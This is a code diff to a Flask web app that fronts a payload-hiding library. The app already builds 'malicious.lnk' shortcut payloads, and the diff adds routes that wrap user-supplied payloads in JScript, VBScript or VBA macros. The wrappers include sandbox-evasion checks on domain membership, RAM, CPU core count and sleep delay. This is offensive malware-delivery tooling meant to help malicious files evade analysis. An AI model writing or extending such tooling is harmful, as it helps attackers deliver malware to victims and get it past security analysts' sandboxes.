@@ -2,7 +2,7 @@ import os
 import secrets
 from flask import Flask, render_template, request, jsonify, send_from_directory
 from werkzeug.utils import secure_filename
-from hider import MetadataEngine, UniversalEngine, PDFHandler, OfficeHandler, PEHandler, VideoHandler, LSBEngine, LNKHandler, EncryptionEngine, AudioHandler, ArchiveHandler
+from hider import MetadataEngine, UniversalEngine, PDFHandler, OfficeHandler, PEHandler, VideoHandler, LSBEngine, LNKHandler, EncryptionEngine, AudioHandler, ArchiveHandler, EvasionEngine, MacroEngine
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
@@ -164,6 +164,39 @@ def process():
             output_filename = "malicious.lnk"
             output_path = os.path.join(app.config['OUTPUT_FOLDER'], output_filename)
             LNKHandler.create_lnk_payload(cmd, output_path)
+            return jsonify({'success': True, 'filename': output_filename})
+
+        elif command == 'evasion':
+            payload = request.form.get('data', '')
+            wrapper_type = request.form.get('evasion_type', 'jscript')
+            check_domain = request.form.get('check_domain') == 'true'
+            min_ram = int(request.form.get('min_ram') or 0)
+            min_cores = int(request.form.get('min_cores') or 0)
+            sleep_ms = int(request.form.get('sleep_ms') or 0)
+            
+            output_filename = f"evasion_wrapper.{'js' if wrapper_type == 'jscript' else 'vbs'}"
+            output_path = os.path.join(app.config['OUTPUT_FOLDER'], output_filename)
+            
+            if wrapper_type == "jscript":
+                wrapped = EvasionEngine.wrap_jscript(payload, check_domain, min_ram, min_cores, sleep_ms)
+            else:
+                wrapped = EvasionEngine.wrap_vbscript(payload, check_domain, min_ram, min_cores, sleep_ms)
+                
+            with open(output_path, "w") as f:
+                f.write(wrapped)
+            return jsonify({'success': True, 'filename': output_filename})
+
+        elif command == 'vba':
+            payload = request.form.get('data', '')
+            check_domain = request.form.get('check_domain') == 'true'
+            min_ram = int(request.form.get('min_ram') or 0)
+            min_cores = int(request.form.get('min_cores') or 0)
+            sleep_ms = int(request.form.get('sleep_ms') or 0)
+            
+            output_filename = "macro.vba"
+            output_path = os.path.join(app.config['OUTPUT_FOLDER'], output_filename)
+            
+            MacroEngine.generate_vba(payload, output_path, check_domain, min_ram, min_cores, sleep_ms)
             return jsonify({'success': True, 'filename': output_filename})
 
         return jsonify({'success': True, 'filename': output_filename})
